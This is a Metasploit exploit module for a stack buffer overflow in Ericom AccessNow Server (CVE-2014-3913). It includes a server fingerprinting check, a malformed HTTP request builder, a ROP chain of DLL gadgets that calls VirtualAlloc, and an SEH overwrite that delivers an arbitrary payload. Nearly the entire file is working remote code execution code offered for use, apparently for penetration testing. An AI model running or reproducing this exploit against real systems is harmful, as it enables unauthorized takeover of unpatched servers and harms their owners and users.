##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ericom AccessNow Server Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack based buffer overflow in Ericom AccessNow Server. The
        vulnerability is due to an insecure usage of vsprintf with user controlled data,
        which can be triggered with a malformed HTTP request. This module has been tested
        successfully with Ericom AccessNow Server 2.4.0.2 on Windows XP SP3 and Windows 2003
        Server SP2.
      },
      'Author'         =>
        [
          'Unknown', # Vulnerability Discovery
          'juan vazquez', # Metasploit Module
        ],
      'References'     =>
        [
          ['ZDI', '14-160'],
          ['CVE', '2014-3913'],
          ['BID', '67777'],
          ['URL','http://www.ericom.com/security-ERM-2014-610.asp']
        ],
      'Privileged'     => true,
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'    => 4096,
          'BadChars' => "\x00\x0d\x0a",
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'Targets'        =>
        [
          [ 'Ericom AccessNow Server 2.4.0.2 / Windows [XP SP3 / 2003 SP2]',
            {
              'RopOffset' => 62,
              'Offset' => 30668,
              'Ret' => 0x104da1e5 # 0x104da1e5 {pivot 1200 / 0x4b0} # ADD ESP,4B0 # RETN # From AccessNowAccelerator32.dll
            }
          ]
        ],
      'DisclosureDate' => 'Jun 2 2014',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(8080)], self.class)
  end


  def check
    res = send_request_cgi({
      'uri' => '/AccessNow/start.html'
    })

    unless res && res.code == 200 && res.headers['Server']
      return Exploit::CheckCode::Safe
    end

    if res.headers['Server'] =~ /Ericom AccessNow Server/
      return Exploit::CheckCode::Appears # Ericom AccessNow 2.4
    elsif res && res.code == 200 && res.headers['Server'] && res.headers['Server'] =~ /Ericom Access Server/
      return Exploit::CheckCode::Detected # Ericom AccessNow 3
    end

    Exploit::CheckCode::Unknown
  end

  def exploit_uri
    uri = "#{rand_text_alpha(1)} " # To ensure a "malformed request" error message
    uri << rand_text(target['RopOffset'])
    uri << create_rop_chain
    uri << payload.encoded
    uri << rand_text(target['Offset'] - uri.length)
    uri << rand_text(4) # nseh
    uri << [target.ret].pack("V") # seh

    uri
  end

  def exploit
    print_status("#{peer} - Sending malformed request...")
    send_request_raw({
      'method'  => 'GET',
      'uri'     => exploit_uri,
      'encode'  => false
    }, 1)
  end

  def create_rop_chain
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
      [
        0x10518867, # RETN # [AccessNowAccelerator32.dll] # Padding to ensure it works in both windows 2003 SP2 and XP SP3
        0x10518867, # RETN # [AccessNowAccelerator32.dll] # Padding to ensure it works in both windows 2003 SP2 and XP SP3
        0x10518866, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0x105c6294, # ptr to &VirtualAlloc() [IAT AccessNowAccelerator32.dll]
        0x101f292b, # MOV EAX,DWORD PTR DS:[EAX] # RETN [AccessNowAccelerator32.dll]
        0x101017e6, # XCHG EAX,ESI # RETN [AccessNowAccelerator32.dll]
        0x103ba89c, # POP EBP # RETN [AccessNowAccelerator32.dll]
        0x103eed74, # & jmp esp [AccessNowAccelerator32.dll]
        0x1055dac2, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0xffffffff, # Value to negate, will become 0x00000001
        0x1052f511, # NEG EAX # RETN [AccessNowAccelerator32.dll]
        0x10065f69, # XCHG EAX,EBX # RETN [AccessNowAccelerator32.dll]
        0x10074429, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0xfbdbcb75, # put delta into eax (-> put 0x00001000 into edx)
        0x10541810, # ADD EAX,424448B # RETN [AccessNowAccelerator32.dll]
        0x1038e58a, # XCHG EAX,EDX # RETN [AccessNowAccelerator32.dll]
        0x1055d604, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0xffffffc0, # Value to negate, will become 0x00000040
        0x10528db3, # NEG EAX # RETN [AccessNowAccelerator32.dll]
        0x1057555d, # XCHG EAX,ECX # RETN [AccessNowAccelerator32.dll]
        0x1045fd24, # POP EDI # RETN [AccessNowAccelerator32.dll]
        0x10374022, # RETN (ROP NOP) [AccessNowAccelerator32.dll]
        0x101f25d4, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0x90909090, # nop
        0x1052cfce  # PUSHAD # RETN [AccessNowAccelerator32.dll]
      ].pack("V*")

    rop_gadgets
  end

end